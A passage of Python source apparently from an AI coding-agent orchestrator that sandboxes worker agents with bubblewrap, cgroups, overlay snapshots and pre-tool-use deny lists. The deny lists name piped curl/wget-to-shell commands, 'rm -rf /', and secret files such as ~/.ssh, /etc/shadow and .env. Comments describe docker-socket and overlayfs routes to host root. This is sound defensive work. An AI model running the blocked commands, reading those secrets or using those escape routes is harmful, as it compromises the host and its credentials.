# Spec: spec_phase4_hardening §1.4
#
# Applies even when bwrap is unavailable (NoSandbox fallback path). The deny-
# list is checked in _scan_bash (extended) and in _scan_fs_access (new), both
# called from agent/safety/hooks.py PreToolUse.
#
# Default patterns live in skills/policy/sandbox-deny-list.yaml.
# Override via env BMAD_DENY_LIST_PATH=<yaml>. The override EXTENDS defaults.
# ─────────────────────────────────────────────────────────────────────────────

_DENY_LIST_ENV_VAR = "BMAD_DENY_LIST_PATH"

# Default fs deny patterns (mirrors sandbox-deny-list.yaml).
_DEFAULT_FS_PATTERNS: tuple[str, ...] = (
    "**/.env",
    "**/.env.*",
    "~/.ssh/**",
    "/etc/shadow",
    "**/credentials.json",
    "**/*.pem",
)

# Default bash deny regexes (compiled case-insensitive, mirrors YAML).
_DEFAULT_BASH_PATTERNS: tuple[str, ...] = (
    r"curl.*\|\s*(bash|sh|python|python3)",
    r"wget.*\|\s*(bash|sh|python|python3)",
    r"rm\s+-rf\s+/(?!tmp/|home/.+/\.claude/)",
)


class FsDenyList(NamedTuple):
    """Compiled FS deny patterns for Read/Write/Edit/Glob/Grep tools."""

    patterns: tuple[str, ...]


class BashDenyList(NamedTuple):
    """Compiled bash deny regexes."""

    regexes: tuple[re.Pattern[str], ...]


def _read_deny_yaml(path: Path) -> tuple[list[str], list[str]]:
    """Read ``fs`` + ``bash`` lists from a YAML deny-list file.

    Returns ``(fs_patterns, bash_patterns)``. On any error returns empty lists
    so callers can safely union with defaults without failing open.
    """
    try:
        import yaml as _yaml
        raw = _yaml.safe_load(path.read_text(encoding="utf-8"))
    except Exception as exc:
        log.warning("deny_list_yaml_read_failed path=%s error=%s", path, exc)
        return [], []
    if not isinstance(raw, dict):
        return [], []
    fs = raw.get("fs", [])
    bash = raw.get("bash", [])
    return (
        [str(p) for p in fs if p] if isinstance(fs, list) else [],
        [str(p) for p in bash if p] if isinstance(bash, list) else [],
    )


def compile_deny_lists(
    *,
    override_path: Path | None = None,
) -> tuple[FsDenyList, BashDenyList]:
    """Build ``FsDenyList`` + ``BashDenyList`` from defaults + optional override.

    Resolution order:
      1. Default policy from ``<orchestrator_home>/skills/policy/sandbox-deny-list.yaml``
         (if present; otherwise falls back to hard-coded ``_DEFAULT_*`` tuples).
      2. ``override_path`` (explicit caller arg) — extends defaults.
      3. ``BMAD_DENY_LIST_PATH`` env var — extends (higher priority than
         ``override_path`` when both provided, both are unioned).

    The override EXTENDS the defaults (union), not replaces them.

    Returns always-valid structures even if YAML loading fails (fail-closed:
    defaults always included so the deny-list can never silently shrink).
    """
    fs_patterns: set[str] = set(_DEFAULT_FS_PATTERNS)
    bash_patterns: set[str] = set(_DEFAULT_BASH_PATTERNS)

    # Try to load the default policy YAML from orchestrator_home.
    _default_yaml_loaded = False
    try:
        from bmad_orchestrator.config import load_settings as _load_settings
        _settings = _load_settings()
        default_yaml = _settings.orchestrator_home / "skills" / "policy" / "sandbox-deny-list.yaml"
        if default_yaml.exists():
            extra_fs, extra_bash = _read_deny_yaml(default_yaml)
            # YAML overrides the hard-coded defaults (replace, then extend with overrides)
            if extra_fs:
                fs_patterns = set(extra_fs)
                _default_yaml_loaded = True
            if extra_bash:
                bash_patterns = set(extra_bash) if _default_yaml_loaded else bash_patterns | set(extra_bash)
    except Exception as exc:
        log.warning("deny_list_default_yaml_load_failed error=%s", exc)

    # Add any explicit override_path.
    if override_path is not None and override_path.exists():
        extra_fs, extra_bash = _read_deny_yaml(override_path)
        fs_patterns = fs_patterns | set(extra_fs)
        bash_patterns = bash_patterns | set(extra_bash)

    # Add env-var override.
    env_path_str = os.environ.get(_DENY_LIST_ENV_VAR, "").strip()
    if env_path_str:
        env_path = Path(env_path_str)
        if env_path.exists():
            extra_fs, extra_bash = _read_deny_yaml(env_path)
            fs_patterns = fs_patterns | set(extra_fs)
            bash_patterns = bash_patterns | set(extra_bash)
        else:
            log.warning("deny_list_env_path_not_found path=%s", env_path_str)

    # Compile bash regexes (case-insensitive).
    compiled: list[re.Pattern[str]] = []
    for pat in sorted(bash_patterns):
        try:
            compiled.append(re.compile(pat, re.IGNORECASE))
        except re.error as exc:
            log.warning("deny_list_bash_regex_invalid pattern=%s error=%s", pat, exc)

    return (
        FsDenyList(patterns=tuple(sorted(fs_patterns))),
        BashDenyList(regexes=tuple(compiled)),
    )


def match_fs_deny(path_str: str, deny_list: FsDenyList) -> str | None:
    """Check ``path_str`` against ``FsDenyList``.

    Expands ``~`` in patterns and in the path. Matches via ``fnmatch.fnmatch``
    (glob-style). Returns the first matching pattern string, or ``None``.
    """
    # Expand tilde in input path for comparison.
    expanded = os.path.expanduser(path_str)
    for pattern in deny_list.patterns:
        expanded_pattern = os.path.expanduser(pattern)
        # Try direct fnmatch (handles ** as a single-segment glob).
        if fnmatch.fnmatch(expanded, expanded_pattern):
            return pattern
        # Also try against just the filename for patterns without directory parts.
        if "/" not in expanded_pattern and fnmatch.fnmatch(
            os.path.basename(expanded), expanded_pattern
        ):
            return pattern
        # For ** patterns, also check if any path segment sequence matches.
        # fnmatch doesn't natively support **, so we do a suffix check:
        # "**/.env" should match "/project/.env" and "/a/b/.env".
        if "**" in expanded_pattern:
            # Strip leading **/ and match against the path suffix.
            suffix_pat = expanded_pattern.lstrip("*").lstrip("/")
            if suffix_pat and fnmatch.fnmatch(os.path.basename(expanded), suffix_pat):
                return pattern
            # Also test if path ends with the non-** part.
            parts = expanded_pattern.split("**/")
            if len(parts) > 1 and parts[-1]:
                tail = parts[-1]
                if fnmatch.fnmatch(expanded, f"*{tail}") or expanded.endswith(f"/{tail}") or expanded == tail:
                    return pattern
    return None


def match_bash_deny(command: str, deny_list: BashDenyList) -> str | None:
    """Check ``command`` against ``BashDenyList``.

    Returns the pattern string of the first matching regex, or ``None``.
    """
    for regex in deny_list.regexes:
        if regex.search(command):
            return regex.pattern
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Q-260527-WTISO-BW · S1 — `wrap` subcommand (option C CLI entry).
#
# Spec: spec/spec_wtiso-bw.md §3.1 + §4. This S1 lands argparse scaffold +
# bwrap version assertion (≥0.6.0 floor, see spec §3.1 rationale on
# `--bind-try` / `--ro-bind-try` introduction). S2-S4 add overlay prep,
# cgroup wrap, env clearenv composition. The actual bind/blackout/clearenv
# pipeline is delegated to ``BwrapSandbox.wrap_command`` (already battle-
# tested); CLI only composes args and execvp's into the wrapped invocation.
# ─────────────────────────────────────────────────────────────────────────────

EXIT_SANDBOX_UNAVAILABLE = 78  # sysexits.h EX_CONFIG (spec §4.3)

_BWRAP_VERSION_FLOOR_DEFAULT: tuple[int, int, int] = (0, 6, 0)
_BWRAP_VERSION_RE = re.compile(r"bubblewrap\s+(\d+)\.(\d+)\.(\d+)")


def _parse_bwrap_version(stdout: str) -> tuple[int, int, int] | None:
    """Parse ``bubblewrap X.Y.Z`` from ``bwrap --version`` output.

    Tolerates extra trailing tokens (some distros append build metadata).
    Returns ``None`` when no match — caller treats unparseable as below-floor.
    """
    if not stdout:
        return None
    match = _BWRAP_VERSION_RE.search(stdout)
    if not match:
        return None
    return (int(match.group(1)), int(match.group(2)), int(match.group(3)))


def _read_bwrap_version_floor() -> tuple[int, int, int]:
    """Resolve floor from ``BMAD_BWRAP_MIN_VERSION`` env, clamped to default.

    Edge-case-hunter HIGH F9: env value CAN ONLY RAISE the floor, never
    lower it. Mirror precedent: ``_MIN_NPROC`` floor logic. Operator typo
    or copy-paste of stale fixture value cannot regress the CVE-rationale
    minimum (0.6.0 for ``--bind-try`` / ``--ro-bind-try``).
    """
    raw = os.environ.get("BMAD_BWRAP_MIN_VERSION", "").strip()
    if not raw:
        return _BWRAP_VERSION_FLOOR_DEFAULT
    match = re.match(r"^(\d+)\.(\d+)\.(\d+)$", raw)
    if not match:
        log.warning(
            "bwrap_min_version_invalid_format env=BMAD_BWRAP_MIN_VERSION "
            "value=%r — using default %s",
            raw, ".".join(str(x) for x in _BWRAP_VERSION_FLOOR_DEFAULT),
        )
        return _BWRAP_VERSION_FLOOR_DEFAULT
    env_floor = (int(match.group(1)), int(match.group(2)), int(match.group(3)))
    return max(env_floor, _BWRAP_VERSION_FLOOR_DEFAULT)


def _assert_bwrap_version_floor(bwrap_path: str) -> tuple[bool, str | None]:
    """Execute ``bwrap --version`` and verify ≥ floor.

    Returns ``(ok, observed_version_str_or_None)``. ``ok=False`` on any of:
    process error, parse failure, or below-floor version.
    """
    import subprocess
    try:
        proc = subprocess.run(  # noqa: S603 — bwrap_path is shutil.which-resolved
            [bwrap_path, "--version"],
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        log.error("bwrap_version_check_failed path=%s error=%s", bwrap_path, exc)
        return False, None
    # bwrap writes to stdout on modern versions; older builds (<0.5) used
    # stderr. Try both.
    parsed = _parse_bwrap_version(proc.stdout) or _parse_bwrap_version(proc.stderr)
    if parsed is None:
        return False, None
    floor = _read_bwrap_version_floor()
    observed_str = ".".join(str(x) for x in parsed)
    return parsed >= floor, observed_str


def _allow_nosandbox(cli_flag: int | None) -> bool:
    """Operator opt-in resolves any of: CLI ``--allow-nosandbox=1`` /
    ``BMAD_ALLOW_NOSANDBOX=1``.

    ``BMAD_SANDBOX=none`` is NOT an opt-in (S3 spec fix per M5 outcome metric):
    setting the backend to "none" without an explicit ALLOW flag must hard-fail
    so silent operator misconfiguration cannot bypass primary safety. See
    spec §3.4.2 v2 read + §8 M5 row. The wrap subcommand checks
    ``BMAD_SANDBOX=none`` separately and emits ``sandbox_required_but_disabled``
    if ALLOW is not set.
    """
    if cli_flag == 1:
        return True
    if os.environ.get("BMAD_ALLOW_NOSANDBOX", "").strip().lower() in {"1", "true", "yes"}:
        return True
    return False


def _sandbox_backend_none_requested() -> bool:
    """Operator explicitly chose backend=none via env (NOT itself an opt-in)."""
    return os.environ.get("BMAD_SANDBOX", "").strip().lower() == "none"


# S3 — env overrides for cgroup limits (spec §5 row `BMAD_SANDBOX_CGROUP_*`).
# Allow tests + operators to dial TasksMax/MemoryMax/CPUQuota without code
# patching. M1 fork-bomb canary needs a tight TasksMax to verify enforcement
# without actually saturating the host PID table.
_ENV_CGROUP_TASKS_MAX = "BMAD_SANDBOX_CGROUP_TASKS_MAX"
_ENV_CGROUP_MEMORY_MAX = "BMAD_SANDBOX_CGROUP_MEMORY_MAX"
_ENV_CGROUP_CPU_QUOTA = "BMAD_SANDBOX_CGROUP_CPU_QUOTA"
_ENV_DISABLE_CGROUP = "BMAD_SANDBOX_CGROUP"  # set to "0" / "off" to disable


def _resolved_cgroup_limits() -> dict[str, str]:
    """Default cgroup limits with env-var overrides applied.

    Env overrides are passed verbatim to systemd-run ``-p Key=Value`` so they
    must use systemd property syntax (e.g. ``8G``, ``200%``, ``16384``).
    """
    limits = dict(DEFAULT_CGROUP_LIMITS)
    tm = os.environ.get(_ENV_CGROUP_TASKS_MAX, "").strip()
    if tm:
        limits["TasksMax"] = tm
    mm = os.environ.get(_ENV_CGROUP_MEMORY_MAX, "").strip()
    if mm:
        limits["MemoryMax"] = mm
    cq = os.environ.get(_ENV_CGROUP_CPU_QUOTA, "").strip()
    if cq:
        limits["CPUQuota"] = cq
    return limits


def _cgroup_disabled_by_env() -> bool:
    """``BMAD_SANDBOX_CGROUP=0|off|false|no`` disables cgroup composition."""
    raw = os.environ.get(_ENV_DISABLE_CGROUP, "").strip().lower()
    return raw in {"0", "off", "false", "no"}


def _scope_cgroup_path(unit_name: str) -> Path:
    """Best-effort path to the user-scope cgroup directory.

    ``systemd-run --user --scope --unit=<unit>.scope`` creates the cgroup at
    ``/sys/fs/cgroup/user.slice/user-<uid>.slice/user@<uid>.service/app.slice/<unit>.scope/``.
    Caller treats a missing path as "cgroup already reaped" — not an error.
    """
    uid = os.getuid()
    return Path(
        f"/sys/fs/cgroup/user.slice/user-{uid}.slice/"
        f"user@{uid}.service/app.slice/{unit_name}.scope"
    )


def _read_pids_max_count(scope_cg: Path) -> int:
    """Read the ``pids.events`` ``max`` counter from a scope cgroup.

    Returns 0 if the file is missing (cgroup already reaped) or unparseable.
    Cgroup v2 ``pids.events`` format:

        max <int>
        max.imposed <int>   # kernel 5.14+, optional
    """
    try:
        text = (scope_cg / "pids.events").read_text(encoding="utf-8")
    except OSError:
        return 0
    for line in text.splitlines():
        parts = line.strip().split()
        if len(parts) == 2 and parts[0] == "max":
            try:
                return int(parts[1])
            except ValueError:
                return 0
    return 0


def _emit_sandbox_audit(event_type: str, **payload: object) -> None:
    """Best-effort audit emit; failures must not crash CLI."""
    try:
        from bmad_orchestrator.agent.safety.audit import record_audit
        record_audit(event_type, **payload)
    except Exception as exc:
        log.warning("sandbox_audit_emit_failed event=%s error=%s", event_type, exc)


# ─────────────────────────────────────────────────────────────────────────────
# S2 — per-worker overlay preparation (spec §3.2)
#
# Two-stage scheme: ONE master snapshot per batch (under flock на
# ``~/.claude/.batch-snapshot.lock`` so concurrent batches don't tear the host
# state mid-copy), then per-worker fast ``cp -R`` от master (local-FS, не
# touching host home again). Master snapshot hash recorded for AC5
# byte-identical reproducibility. Stale ``/tmp/888-bat-*`` sweep prevents
# disk-fill on dispatcher crashes (edge-case-hunter HIGH F8 fix).
# ─────────────────────────────────────────────────────────────────────────────

_OVERLAY_CLAUDE_SUBPATHS: tuple[tuple[str, ...], ...] = (
    (".claude",),
    (".claude.json",),
)
_OVERLAY_SNAPSHOT_HASH_FILE = ".snapshot.sha256"
_OVERLAY_LOCK_BASENAME = ".batch-snapshot.lock"
_OVERLAY_STALE_MAX_AGE_SECONDS = 86_400  # 24h (spec §3.2 «older-than-24h»)


def _overlay_master_root(batch_dir: Path) -> Path:
    return batch_dir / "master-snapshot"


def _overlay_worker_root(batch_dir: Path, q_id: str) -> Path:
    return batch_dir / "overlays" / q_id


def _compute_overlay_tree_sha256(root: Path) -> str:
    """Deterministic SHA256 over (relpath, content) pairs sorted by relpath.

    Skips symlinks (avoids cycles) and ``.snapshot.sha256`` marker itself.
    Used for AC5 reproducibility: identical host snapshot → identical hash.
    """
    import hashlib
    h = hashlib.sha256()
    entries: list[tuple[str, Path]] = []
    for entry in root.rglob("*"):
        if not entry.is_file() or entry.is_symlink():
            continue
        try:
            rel = entry.relative_to(root)
        except ValueError:
            continue
        if rel.name == _OVERLAY_SNAPSHOT_HASH_FILE:
            continue
        entries.append((str(rel), entry))
    entries.sort(key=lambda x: x[0])
    for relpath, entry in entries:
        h.update(relpath.encode("utf-8"))
        h.update(b"\0")
        try:
            with open(entry, "rb") as fh:
                while True:
                    chunk = fh.read(65536)
                    if not chunk:
                        break
                    h.update(chunk)
        except OSError as exc:
            log.warning("overlay_hash_skip_unreadable rel=%s error=%s", relpath, exc)
            continue
        h.update(b"\0")
    return h.hexdigest()


def _prepare_overlays_master(
    batch_dir: Path,
    *,
    source_home: Path | None = None,
) -> tuple[Path, str]:
    """Create master snapshot of ~/.claude + ~/.claude.json under flock.

    Idempotent: if ``master-snapshot/.snapshot.sha256`` exists, returns cached
    path + hash без повторного copy (spec §3.2 «ОДНОКРАТНО BEFORE worker
    fan-out»). Emits ``master_snapshot_taken`` audit event с hash on first
    create.

    Concurrent-safety (edge-case-hunter HIGH F6): flock на
    ``<source_home>/.batch-snapshot.lock`` serialises N parallel batch starts —
    host SQLite-WAL мid-save не теряет integrity. Per-worker copies later use
    THIS master, не host ~/.claude, so worker fan-out has zero host I/O.
    """
    import fcntl as _fcntl
    import subprocess as _subprocess

    host = source_home if source_home is not None else Path(os.path.expanduser("~"))
    master_root = _overlay_master_root(batch_dir)
    hash_file = master_root / _OVERLAY_SNAPSHOT_HASH_FILE

    if hash_file.exists() and (master_root / ".claude").exists():
        return master_root, hash_file.read_text(encoding="utf-8").strip()

    master_root.mkdir(parents=True, exist_ok=True)
    lock_path = host / _OVERLAY_LOCK_BASENAME
    try:
        lock_path.touch(exist_ok=True)
    except OSError as exc:
        log.warning(
            "overlay_lock_touch_failed path=%s error=%s — proceeding без flock",
            lock_path, exc,
        )
        lock_fh = None
    else:
        lock_fh = open(lock_path, "rb")

    try:
        if lock_fh is not None:
            _fcntl.flock(lock_fh.fileno(), _fcntl.LOCK_EX)
        for parts in _OVERLAY_CLAUDE_SUBPATHS:
            src = host.joinpath(*parts)
            dst = master_root.joinpath(*parts)
            if dst.exists():
                continue
            if not src.exists():
                continue
            if src.is_dir():
                _subprocess.run(  # noqa: S603 — fixed argv, trusted paths
                    ["/bin/cp", "-R", "--preserve=mode,timestamps", str(src), str(dst)],
                    check=True,
                )
            else:
                dst.parent.mkdir(parents=True, exist_ok=True)
                _subprocess.run(  # noqa: S603
                    ["/bin/cp", "--preserve=mode,timestamps", str(src), str(dst)],
                    check=True,
                )
    finally:
        if lock_fh is not None:
            try:
                _fcntl.flock(lock_fh.fileno(), _fcntl.LOCK_UN)
            finally:
                lock_fh.close()

    tree_hash = _compute_overlay_tree_sha256(master_root)
    hash_file.write_text(tree_hash + "\n", encoding="utf-8")

    _emit_sandbox_audit(
        "master_snapshot_taken",
        schema_version="1",
        batch_dir=str(batch_dir),
        master_root=str(master_root),
        snapshot_sha256=tree_hash,
        source_home=str(host),
    )
    return master_root, tree_hash


def _prepare_overlay_for_worker(
    batch_dir: Path,
    q_id: str,
    *,
    master_root: Path | None = None,
) -> Path:
    """Per-worker fast ``cp -R`` от master snapshot. Returns worker overlay root.

    Idempotent: existing worker overlay не re-copied. Caller passes returned
    path к ``BwrapSandbox.wrap_command(worker_home_overlay=...)`` (or к the
    CLI flag ``--overlay-source``). Local-FS copy only — host ~/.claude not
    re-read here.
    """
    import subprocess as _subprocess

    if master_root is None:
        master_root = _overlay_master_root(batch_dir)
    if not master_root.exists():
        raise FileNotFoundError(
            f"master snapshot missing at {master_root}; call "
            "_prepare_overlays_master() first"
        )
    worker_root = _overlay_worker_root(batch_dir, q_id)
    worker_root.mkdir(parents=True, exist_ok=True)
    for parts in _OVERLAY_CLAUDE_SUBPATHS:
        src = master_root.joinpath(*parts)
        dst = worker_root.joinpath(*parts)
        if dst.exists() or not src.exists():
            continue
        if src.is_dir():
            _subprocess.run(  # noqa: S603
                ["/bin/cp", "-R", "--preserve=mode,timestamps", str(src), str(dst)],
                check=True,
            )
        else:
            _subprocess.run(  # noqa: S603
                ["/bin/cp", "--preserve=mode,timestamps", str(src), str(dst)],
                check=True,
            )
    return worker_root


def _cleanup_overlays(batch_dir: Path) -> None:
    """Remove batch overlay tree post-batch. Warn-and-continue on failure
    (operator can ``rm -rf /tmp/888-bat-*`` manually per spec §3.2).
    """
    if not batch_dir.exists():
        return
    import shutil as _shutil
    try:
        _shutil.rmtree(batch_dir)
        _emit_sandbox_audit(
            "overlays_cleaned",
            schema_version="1",
            batch_dir=str(batch_dir),
        )
    except OSError as exc:
        log.warning(
            "overlay_cleanup_failed batch_dir=%s error=%s — operator must sweep",
            batch_dir, exc,
        )


def _sweep_stale_overlays(
    tmp_root: Path | None = None,
    *,
    max_age_seconds: int = _OVERLAY_STALE_MAX_AGE_SECONDS,
) -> int:
    """Boot-time scan для ``/tmp/888-bat-*`` older than ``max_age_seconds``.

    Returns count of swept dirs. Emits ``stale_overlay_swept`` per dir
    (edge-case-hunter HIGH F8 — prevent disk-fill on dispatcher crash).
    """
    import shutil as _shutil
    import time as _time

    root = tmp_root if tmp_root is not None else Path("/tmp")  # noqa: S108 — system tmp scan
    if not root.is_dir():
        return 0
    now = _time.time()
    swept = 0
    for entry in root.glob("888-bat-*"):
        if not entry.is_dir():
            continue
        try:
            age = now - entry.stat().st_mtime
        except OSError:
            continue
        if age < max_age_seconds:
            continue
        try:
            _shutil.rmtree(entry)
        except OSError as exc:
            log.warning("stale_sweep_failed entry=%s error=%s", entry, exc)
            continue
        swept += 1
        _emit_sandbox_audit(
            "stale_overlay_swept",
            schema_version="1",
            batch_dir=str(entry),
            age_seconds=int(age),
        )
    return swept


# ─────────────────────────────────────────────────────────────────────────────
# S5 — sev-5/sev-4/sev-3 boot-time threat closures (spec §6.1, §11 #7, AC6-AC10)
#
# AC6 docker-group pivot (T7 sev-5): refuse to spawn if orchestrator UID is in
# the ``docker`` group AND /var/run/docker.sock is reachable — the worker
# would otherwise be one ``docker run --privileged`` away from host root.
# AC7 unprivileged_userns_clone (C2 sev-5): if kernel allows unprivileged user
# namespaces AND operator asked for ``overlayfs`` mode → audit + fall back to
# ``copy`` unless explicitly opted in via BMAD_ALLOW_OVERLAYFS=1.
# AC8/AC10 user-namespace (#20 sev-3 + T11 sev-3): handled by adding
# ``--unshare-user-try`` to bwrap argv (BwrapSandbox.wrap_command).
# AC9 die-with-parent (D4 sev-4): already wired via ``--die-with-parent`` in
# wrap_command; this session adds the canary test.
# ─────────────────────────────────────────────────────────────────────────────

_DOCKER_SOCKET_DEFAULT = "/var/run/docker.sock"
_USERNS_CLONE_DEFAULT = "/proc/sys/kernel/unprivileged_userns_clone"


def _current_groups() -> list[str]:
    """Return current process group names. Test override: BMAD_TEST_DOCKER_GROUPS
    (comma-separated names) short-circuits the os.getgroups() lookup so canary
    tests can simulate the dangerous configuration without modifying host
    /etc/group.
    """
    override = os.environ.get("BMAD_TEST_DOCKER_GROUPS")
    if override is not None:
        return [g.strip() for g in override.split(",") if g.strip()]
    try:
        import grp as _grp
        names: list[str] = []
        for gid in os.getgroups():
            try:
                names.append(_grp.getgrgid(gid).gr_name)
            except KeyError:
                continue
        return names
    except Exception as exc:
        log.warning("current_groups_lookup_failed error=%s", exc)
        return []


def _docker_socket_path() -> str:
    return os.environ.get("BMAD_TEST_DOCKER_SOCKET_PATH", _DOCKER_SOCKET_DEFAULT)


def _docker_socket_present() -> bool:
    return Path(_docker_socket_path()).exists()


def _assert_no_docker_group(allow_nosandbox: bool) -> int | None:
    """Boot-time check: refuse to wrap a worker if dispatcher UID has docker
    group access AND a docker socket is reachable. Returns exit code on refusal,
    None to continue. Honours ``allow_nosandbox`` AND a dedicated
    ``BMAD_ALLOW_DOCKER_GROUP=1`` opt-out (so dev hosts whose operator UID is
    permanently in `docker` group can run the worker pool без global
    BMAD_ALLOW_NOSANDBOX exposure — the docker risk is acknowledged but the
    rest of the sandbox stays primary).
    """
    if "docker" not in _current_groups():
        return None
    if not _docker_socket_present():
        return None
    sock = _docker_socket_path()
    _emit_sandbox_audit(
        "sandbox_violation_blocked",
        schema_version="1",
        violation_type="docker_socket_pivot",
        path_or_var=sock,
        outcome="blocked",
        detector="boot_assert_no_docker_group",
    )
    allow_docker = os.environ.get("BMAD_ALLOW_DOCKER_GROUP", "").strip() == "1"
    if allow_docker or allow_nosandbox:
        which = "BMAD_ALLOW_DOCKER_GROUP=1" if allow_docker else "BMAD_ALLOW_NOSANDBOX=1"
        sys.stderr.write(
            "[sandbox] primary safety теряется — orchestrator UID in `docker` "
            f"group AND {sock} reachable; {which} lets it run but the worker "
            "can pivot к host root via docker daemon.\n"
        )
        return None
    sys.stderr.write(
        f"orchestrator UID is in `docker` group AND {sock} exists — refusing "
        "to spawn worker (host-root pivot risk via docker daemon). Drop the "
        "user from `docker` group, OR set BMAD_ALLOW_DOCKER_GROUP=1 to "
        "acknowledge the risk, OR set BMAD_ALLOW_NOSANDBOX=1 to fully opt out.\n"
    )
    return EXIT_SANDBOX_UNAVAILABLE


def _userns_clone_enabled(path: str | None = None) -> bool | None:
    """Read kernel's unprivileged_userns_clone flag. Returns True/False, or
    None when path is missing / unreadable (kernel doesn't expose the knob).
    """
    p = path or os.environ.get("BMAD_TEST_USERNS_CLONE_PATH") or _USERNS_CLONE_DEFAULT
    try:
        raw = Path(p).read_text(encoding="utf-8").strip()
    except OSError:
        return None
    return raw == "1"


def _check_userns_safety(overlay_mode: str) -> str:
    """Resolve overlay_mode against the unprivileged userns_clone kernel knob.

    When userns_clone is enabled (=1) AND overlay_mode=overlayfs AND
    BMAD_ALLOW_OVERLAYFS!=1 → audit `overlayfs_unsafe_fallback` and return
    ``copy`` (graceful fall-back). Otherwise return ``overlay_mode`` unchanged.
    Rationale: unpriv user_ns + overlayfs xattr setuid is a known host-root
    escalation class (CVE-2021-3493).
    """
    if overlay_mode != "overlayfs":
        return overlay_mode
    allow = os.environ.get("BMAD_ALLOW_OVERLAYFS", "").strip() == "1"
    if allow:
        return overlay_mode
    enabled = _userns_clone_enabled()
    if enabled is True:
        _emit_sandbox_audit(
            "overlayfs_unsafe_fallback",
            schema_version="1",
            requested_mode="overlayfs",
            fallback_mode="copy",
            userns_clone_enabled=True,
            allow_overlayfs=False,
            outcome="forced_copy_mode",
        )
        sys.stderr.write(
            "[sandbox] --overlay-mode=overlayfs requested AND kernel allows "
            "unprivileged user namespaces (CVE-2021-3493 class risk) — "
            "falling back к copy mode. Set BMAD_ALLOW_OVERLAYFS=1 to override.\n"
        )
        return "copy"
    return overlay_mode


def _cmd_wrap(args: object) -> int:
    """``wrap`` subcommand handler.

    S1 — bwrap version floor assertion.
    S2 — per-worker overlay wiring (``--overlay-mode copy``).
    S3 — cgroup composition (``systemd-run --user --scope``) + NoSandbox
         fallback policy (§3.4.2 firm commit + §5.1 precedence matrix).
    S5 — docker-group / userns_clone boot-time threat closures (AC6/AC7).
    """
    import argparse as _argparse  # local import keeps top-of-file imports lean
    assert isinstance(args, _argparse.Namespace)

    cli_allow = _allow_nosandbox(args.allow_nosandbox)
    require_sb = _require_sandbox()

    # §5.1 row "CONFLICT REQUIRE+ALLOW": REQUIRE wins, hard-fail. Operator
    # panic-paste cases (both flags set) must NOT silently succeed без
    # isolation — security_critical safe-default per spec §5.1 rationale.
    if require_sb and cli_allow:
        _emit_sandbox_audit(
            "policy_conflict_resolved_to_require",
            schema_version="1",
            require_sandbox=True,
            allow_nosandbox=True,
            outcome="hard_fail_exit_78",
        )
        sys.stderr.write(
            "BMAD_REQUIRE_SANDBOX=1 + BMAD_ALLOW_NOSANDBOX=1 are mutually "
            "exclusive; REQUIRE wins (security_critical safe-default).\n"
        )
        return EXIT_SANDBOX_UNAVAILABLE

    # BMAD_SANDBOX=none = explicit operator-chose-no-bwrap. Per spec §8 M5
    # outcome metric this must NOT silently bypass isolation: alone it
    # hard-fails (exit 78); paired with explicit ALLOW it force-sequentials.
    # Diverges from spec §3.4.2 row 6 «alias» — M5 acceptance is
    # authoritative (§13 verification debt; resolved S6 Open Q).
    if _sandbox_backend_none_requested() and not cli_allow:
        _emit_sandbox_audit(
            "sandbox_required_but_disabled",
            schema_version="1",
            sandbox_backend="none",
            allow_nosandbox=False,
            outcome="hard_fail_exit_78",
        )
        sys.stderr.write(
            "BMAD_SANDBOX=none set без BMAD_ALLOW_NOSANDBOX=1 — refusing to "
            "run worker без isolation. Either install/restore bwrap, or set "
            "BMAD_ALLOW_NOSANDBOX=1 to explicitly opt into force-sequential "
            "no-sandbox mode.\n"
        )
        return EXIT_SANDBOX_UNAVAILABLE

    # S5 AC6: refuse if dispatcher UID is in `docker` group + socket reachable.
    # Runs BEFORE bwrap_path check so the dangerous combination cannot proceed
    # even on hosts missing bwrap (otherwise sandbox_hard_fail_no_bwrap masks
    # the deeper docker-pivot risk and operator might force-bypass via ALLOW).
    docker_rc = _assert_no_docker_group(cli_allow)
    if docker_rc is not None:
        return docker_rc

    bwrap_path = shutil.which("bwrap")
    if bwrap_path is None:
        _emit_sandbox_audit(
            "sandbox_hard_fail_no_bwrap",
            schema_version="1",
            outcome="hard_fail_exit_78",
            allow_nosandbox=cli_allow,
        )
        if cli_allow:
            sys.stderr.write(
                "[sandbox] primary safety теряется — bwrap missing AND "
                "BMAD_ALLOW_NOSANDBOX=1; running worker without isolation.\n"
            )
            _emit_sandbox_audit(
                "sandbox_fallback_nosandbox",
                schema_version="1",
                trigger="bwrap_missing",
                force_sequential=True,
                warn_channel="stderr+audit",
            )
            os.execvp(args.command[0], args.command)  # noqa: S606 — intentional shell-less exec
            return 0  # unreachable
        sys.stderr.write(
            "bwrap not found on PATH — install bubblewrap (apt install "
            "bubblewrap) or set BMAD_ALLOW_NOSANDBOX=1 to force-sequential.\n"
        )
        return EXIT_SANDBOX_UNAVAILABLE

    ok, observed = _assert_bwrap_version_floor(bwrap_path)
    if not ok:
        floor = _read_bwrap_version_floor()
        floor_str = ".".join(str(x) for x in floor)
        _emit_sandbox_audit(
            "bwrap_version_floor_failed",
            schema_version="1",
            observed_version=observed,
            required_floor=floor_str,
            bwrap_path=bwrap_path,
            outcome="hard_fail_exit_78",
        )
        if cli_allow:
            sys.stderr.write(
                f"[sandbox] primary safety теряется — bwrap "
                f"{observed or '<unparseable>'} < floor {floor_str} AND "
                "BMAD_ALLOW_NOSANDBOX=1; running worker without isolation.\n"
            )
            _emit_sandbox_audit(
                "sandbox_fallback_nosandbox",
                schema_version="1",
                trigger="version_floor_failed",
                force_sequential=True,
                warn_channel="stderr+audit",
            )
            os.execvp(args.command[0], args.command)  # noqa: S606 — intentional shell-less exec
            return 0  # unreachable
        sys.stderr.write(
            f"bwrap version {observed or '<unparseable>'} below floor "
            f"{floor_str} — upgrade bubblewrap or set BMAD_ALLOW_NOSANDBOX=1.\n"
        )
        return EXIT_SANDBOX_UNAVAILABLE

    # FX1 (Q-260527-WTISO-BW-FX1): boot-check unprivileged_userns_clone so the
    # silent `--unshare-user-try` skip (BwrapSandbox.wrap_command:498-503) is
    # surfaced in audit trail. Worker still proceeds — user-ns isolation is
    # defense-in-depth atop primary PID/IPC/mount namespaces.
    userns_state = _userns_clone_enabled()
    if userns_state is not True:
        _emit_sandbox_audit(
            "user_namespace_unshare_unavailable",
            schema_version="1",
            userns_clone_enabled=userns_state,  # False, or None when knob missing
            detector="boot_check_userns_clone",
            outcome="worker_proceeds_without_userns_isolation",
        )

    # S2 lands overlay wiring; S3-S4 will layer cgroup/clearenv composition.
